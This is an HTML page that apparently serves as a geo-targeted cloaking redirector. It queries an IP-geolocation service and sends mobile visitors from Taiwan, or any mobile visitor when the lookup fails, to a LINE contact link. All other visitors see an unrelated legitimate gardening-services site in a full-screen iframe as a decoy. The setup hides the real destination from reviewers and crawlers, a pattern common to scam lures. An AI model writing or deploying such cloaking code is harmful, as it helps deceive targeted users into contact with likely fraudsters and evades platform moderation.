

<!DOCTYPE html>
<html>
<head> 

  <title>WELCOME</title>
  <meta charset="utf-8">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      width: 100%;
	  font-size: 14px; /* 调整字体大小 */
      
     height: 100%;
      border: none;
    }
  </style>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
	 
  <body onload="handleResponse()">
 
<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

   function isEnglishLang() {
    return navigator.language.startsWith('en') || 
           navigator.languages.some(lang => lang.startsWith('en'));
}
    // 更完整的实现（包含Macau等地区）
function isTraditionalChinese() {
    const tradChineseCodes = ['zh-TW', 'zh-HK', 'zh-MO', 'zh-Hant'];
    return tradChineseCodes.includes(navigator.language) || 
           navigator.languages.some(lang => 
               tradChineseCodes.some(code => lang.startsWith(code))
           );
}

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 严格的三重条件判断
        if (data.country === 'TW' && isMobileDevice() ) {
          window.location.href = "https://line.me/ti/p/RCpA2_J2Hs";
          return;
        }
     
        
        var iframe = document.createElement('iframe');
        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      })
      .catch(() => {
        // IP检测失败时严格的双重条件判断
        if (isMobileDevice()) {
          window.location.href = "https://line.me/ti/p/RCpA2_J2Hs";
          return;
        }
        
        
        var iframe = document.createElement('iframe');
        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      });
  }
</script>
 
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
</body>
</html>
